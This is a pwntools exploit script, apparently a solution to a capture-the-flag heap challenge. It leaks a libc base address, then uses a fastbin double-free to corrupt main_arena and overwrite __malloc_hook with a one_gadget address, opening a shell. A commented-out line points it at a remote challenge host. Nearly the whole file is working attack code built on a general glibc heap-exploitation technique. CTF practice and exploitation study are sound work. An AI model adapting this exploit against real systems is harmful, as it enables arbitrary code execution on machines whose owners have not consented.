#!/usr/bin/python3

from pwn import *

exe = ELF("./da", checksec=False)
libc = ELF("./glibc/libc.so.6", checksec=False)
ld = ELF("./glibc/ld-linux-x86-64.so.2", checksec=False)

context.binary = exe

context.terminal = ['tmux', 'splitw', '-h', '-p', '59', '-I']
context.log_level 	= "WARNING"
isDebug = False

# brva 0x0000000000001624 <-- malloc
# brva 0x000000000000180C <-- free
gs = '''
brva 0x0000000000001624
brva 0x000000000000180C
continue
'''.format(**locals())

def start_local(isDebug, argv=[], *a, **kw):
	if args.GDB or isDebug:
		return gdb.debug([exe.path], gdbscript=gs)
	else:
		return process([exe.path])
		
def find_ip_offset(payload):
	io = process(elf.path)
	io.sendlineafter(b": ", payload)
	
	io.wait()
	
	#ip_offset = cyclic_find(io.corefile.pc) # x86
	ip_offset = cyclic_find(io.corefile.read(io.corefile.sp, 4))
	info("Located RIP offset at [%s]", ip_offset)
	return ip_offset

def leak_libc():
	print("Leaking libc...")
	sleep(1)
	payload = b"r3dDr4g3nst1str0f1" + b'w' * 29
	io.sendlineafter(b"enhance your army's power: ", payload)
	data = io.recv().split(b"\n")
	leaked_address = data[2]
	leaked_int = unpack(leaked_address.rstrip(), 'all', endian="little")
	print(f"{hex(leaked_int)=}")

	libc_file_jumps_offset = 0x003b1420
	libc.address = leaked_int - libc_file_jumps_offset
	print(f"{hex(libc.address)=}")

def malloc_summon(size: int, userdata: bytes, withLine:bool = True):
	io.sendline(b"1")
	io.sendlineafter(b"length:", f"{size}".encode())
	io.sendlineafter(b"dragon:", userdata)

def free_release(index: int):
	io.sendlineafter(b">> ", b"2")
	io.sendlineafter(b"choice:", f"{index}".encode())

#===========================================================
#                    EXPLOIT GOES HERE					   #
#===========================================================

######## LOCAL ########
#ip_offset = find_ip_offset(cyclic(200))
#ip_offset = 56
io = start_local(isDebug)
# io = remote("188.166.175.58", 31935)


# Adding this time out because there is another io.sendlineafter call in the malloc_summon function that gets called 
# AFTER __malloc_hook gets called. So we are left with a state that causes the pwntools script to "hang" waiting for the appearance
# of the "dragon:" bytes and it never happens. So io.interactive() does not get called and we do not get an interactive shell.
# So setting io.timeout=1 means that after 1 second of not receiving the expected bytes, the code will continue.
# We could also add it specifically to that sendlineafter line. 
io.timeout = 1 
######## REMOTE ########


#  the size values that fall within the ranges of 2-88 and 105-120 will make the if check return false.
leak_libc()

print("Exploiting...")

#########################################################################
# Crafting fake chunk size 0x61 which passes the size check in the binary by setting fd value to 0x61
malloc_summon(0x48, b"pet1")
malloc_summon(0x48, b"pet2")

free_release(0)
free_release(1)
free_release(0)

malloc_summon(0x48, p64(0x61))
#########################################################################

# Releasing remaining fastbin chunks to reach the fake chunk
malloc_summon(0x48, b"a" * 8)
malloc_summon(0x48, b"b" * 8)

#Crafting a new chunk, now in main_arena but using the new size. Setting its 
malloc_summon(0x58, b"c" * 8)
malloc_summon(0x58, b"d" * 8)

free_release(5)
free_release(6)
free_release(5)

malloc_summon(0x58, p64(libc.sym.main_arena + 0x20))
malloc_summon(0x58, b"e" * 8)
malloc_summon(0x58, b"f" * 8)

malloc_summon(0x58, b'g' * 48 + p64(libc.sym.__malloc_hook-35))
malloc_summon(0x28, b'g' * 19 + p64(libc.address + 0xe1fa1))

malloc_summon(0x28, b"")

io.interactive()
